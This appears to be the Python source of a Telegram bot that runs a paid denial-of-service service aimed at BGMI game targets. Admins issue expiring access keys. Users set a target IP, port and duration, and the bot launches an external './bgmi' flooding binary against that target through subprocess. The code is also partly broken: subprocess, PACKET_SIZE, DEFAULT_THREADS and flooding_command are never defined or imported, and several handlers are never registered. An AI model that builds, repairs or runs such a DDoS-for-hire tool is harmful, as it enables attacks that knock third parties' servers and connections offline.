import json
import random
import string
import datetime
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
from config import BOT_TOKEN, ADMIN_IDS

USER_FILE = "users.json"
KEY_FILE = "keys.json"

user_attacks = {}
users = {}
keys = {}
pending_key_requests = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

async def show_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔹 Start Attack", callback_data="start")],
        [InlineKeyboardButton("⛔ Stop Attack", callback_data="stop")],
        [InlineKeyboardButton("🎯 Set Target (BGMI)", callback_data="bgmi")],
        [InlineKeyboardButton("🔑 Generate Key", callback_data="genkey")],
        [InlineKeyboardButton("👥 View Users", callback_data="users")],
        [InlineKeyboardButton("❌ Remove User", callback_data="remove_user")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Choose an action:", reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    
    command = query.data
    if command == "start":
        await start(update, context)
    elif command == "stop":
        await stop(update, context)
    elif command == "bgmi":
        await bgmi(update, context)
    elif command == "genkey":
        await ask_key_duration(update, context)
    elif command == "users":
        await list_users(update, context)
    elif command == "remove_user":
        await update.callback_query.message.reply_text("Send /remove <user_id> to remove a user.")

async def ask_key_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    
    if user_id in ADMIN_IDS:
        await update.callback_query.message.reply_text("Enter the time duration for the key (e.g., `2 hours` or `5 days`):")
        pending_key_requests[user_id] = True
    else:
        await update.callback_query.message.reply_text("❌ Only admins can generate keys.")

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)

    if user_id in pending_key_requests:
        message_text = update.message.text.lower()
        try:
            parts = message_text.split()
            if len(parts) != 2 or not parts[0].isdigit():
                raise ValueError
            
            time_amount = int(parts[0])
            time_unit = parts[1]

            if time_unit not in ["hours", "days"]:
                raise ValueError

            expiration_date = add_time_to_current_date(hours=time_amount if time_unit == "hours" else 0,
                                                       days=time_amount if time_unit == "days" else 0)
            key = generate_key()
            keys[key] = expiration_date
            save_keys()
            
            await update.message.reply_text(f"✅ Key generated: `{key}`\n🔹 Expires on: {expiration_date}")
        
        except ValueError:
            await update.message.reply_text("❌ Invalid format. Please enter time in the format: `2 hours` or `5 days`.")

        del pending_key_requests[user_id]

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not users:
        await update.message.reply_text("📂 No approved users.")
        return
    
    user_list = "👥 Approved Users:\n" + "\n".join([f"🔹 {uid} - Exp: {exp}" for uid, exp in users.items()])
    await update.message.reply_text(user_list)

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Only admins can remove users.")
        return
    
    command_args = context.args
    if not command_args:
        await update.message.reply_text("❌ Please provide a user ID. Format: /remove <user_id>")
        return
    
    target_user = command_args[0]
    
    if target_user in users:
        del users[target_user]
        save_users()
        await update.message.reply_text(f"✅ User {target_user} removed.")
    else:
        await update.message.reply_text("❌ User not found.")

# Modify the start command to track which user started the attack
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_attacks, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if user_id in user_attacks:
        await update.message.reply_text('❌ You already have an active attack running.')
        return

    if flooding_command is None:
        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
        return

    flooding_process = subprocess.Popen(flooding_command)
    user_attacks[user_id] = flooding_process
    await update.message.reply_text('🚀 Attack started...🚀')

# Modify the stop command to allow users to stop only their own attacks
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_attacks
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if user_id in user_attacks:
        user_attack_process = user_attacks[user_id]
        user_attack_process.terminate()
        del user_attacks[user_id]
        await update.message.reply_text('Attack stopped. ✅')
    else:
        await update.message.reply_text('❌ You have no active attack to stop.')

  
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
        return

    if len(context.args) != 3:
        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(PACKET_SIZE), str(DEFAULT_THREADS)]
    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("menu", show_menu))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("remove", remove_user, pass_args=True))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_input))
    
    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()
